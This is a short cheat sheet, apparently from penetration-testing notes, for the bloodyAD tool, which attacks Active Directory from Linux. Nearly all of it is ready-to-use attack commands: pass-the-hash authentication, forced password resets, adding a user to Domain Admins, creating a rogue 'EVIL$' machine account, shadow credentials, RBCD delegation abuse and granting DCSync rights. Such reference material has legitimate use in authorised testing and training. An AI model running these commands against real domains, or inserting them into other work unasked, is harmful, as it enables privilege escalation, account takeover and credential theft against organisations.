# 03.08 bloodyAD

> Python AD swiss army knife — modify ACLs, add computers, set shadow credentials, all from Linux.

## Overview

bloodyAD lets you perform every common offensive AD operation from a Linux box without Windows tooling. Modify ACLs (add genericAll, ForceChangePassword, AddSelf), add computer accounts, set shadow credentials (msDS-KeyCredentialLink), change passwords, set SPNs, modify msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD. Replaces bookoperator's need to be on Windows for many tasks.

## Steps

- **Step 1** - Install via pip.
- **Step 2** - Run with domain auth (pass or hash or kerberos).
- **Step 3** - Sub-commands: add, set, get, remove.

## Commands

### Install

```bash
pipx install bloodyAD
# or pip install bloodyAD
```

### Auth patterns

```bash
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> <SUBCMD>
bloodyAD -d <DOMAIN> -u <USER> -p :<NT-HASH> --host <DC> <SUBCMD>     # hash auth
bloodyAD -d <DOMAIN> -u <USER> -k --host <DC-FQDN> <SUBCMD>            # kerberos
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> --kerberos <SUBCMD>
```

### Enumeration

```bash
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> get search --filter '(samaccountname=admin*)'
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> get trusts
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> get dnsDump
```

### Change password

```bash
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> set password <TARGET-USER> NewP@ssw0rd1
```

### Add group member

```bash
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add groupMember 'Domain Admins' <USER>
```

### Add computer (MachineAccountQuota)

```bash
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add computer EVIL$ EvilPass123!
```

### Shadow credentials

```bash
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add shadowCredentials <TARGET-USER>
# Outputs cert + PFX file to use with PKINITtools/getTGT.py
```

### RBCD (Resource-Based Constrained Delegation)

```bash
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> set rbcd <TARGET-COMPUTER>$ EVIL$
```

### Force-change password (ACL primitive)

```bash
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> set password <TARGET> NewP@ss
# Requires ForceChangePassword right on <TARGET>
```

### DCSync grant

```bash
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add dcsync <USER>
```
